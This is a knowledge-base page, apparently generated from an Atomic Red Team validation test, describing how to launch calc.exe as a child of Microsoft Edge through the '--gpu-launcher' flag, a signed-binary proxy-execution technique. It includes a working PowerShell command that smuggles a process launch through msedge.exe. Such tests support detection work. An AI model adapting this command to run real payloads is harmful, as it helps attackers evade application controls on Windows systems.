---
atomic_guid: "e5eedaed-ad42-4c1e-8783-19529738a349"
title: "LOLBAS Msedge to Spawn Process"
framework: "atomic"
generated: "true"
attack_technique_id: "T1218"
attack_technique_name: "Signed Binary Proxy Execution"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "e5eedaed-ad42-4c1e-8783-19529738a349"
  - "LOLBAS Msedge to Spawn Process"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# LOLBAS Msedge to Spawn Process

Executes a process under a trusted Microsoft signed binary,mseddge. This test will spawn "calc.exe" as a child process of msedge.exe
- https://lolbas-project.github.io/lolbas/Binaries/Msedge/

## Metadata

- Atomic GUID: e5eedaed-ad42-4c1e-8783-19529738a349
- Technique: T1218: Signed Binary Proxy Execution
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1218/T1218.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218]]

## Executor

- name: powershell

### Command

```powershell
$edgePath64 = "C:\Program Files\Microsoft\Edge\Application\msedge.exe"
if (Test-Path $edgePath64) {
    $edgePath = $edgePath64
} else {
    # Check 32-bit Edge installation path
    $edgePath32 = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
    if (Test-Path $edgePath32) {
        $edgePath = $edgePath32
    } else {
        exit 1
    }
}
& $edgePath --disable-gpu-sandbox --gpu-launcher="C:\\Windows\\System32\\calc.exe &&"
sleep 5
taskkill -f -im msedge.exe
taskkill -f -im calc.exe
taskkill -f -im win32calc.exe
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.yaml)
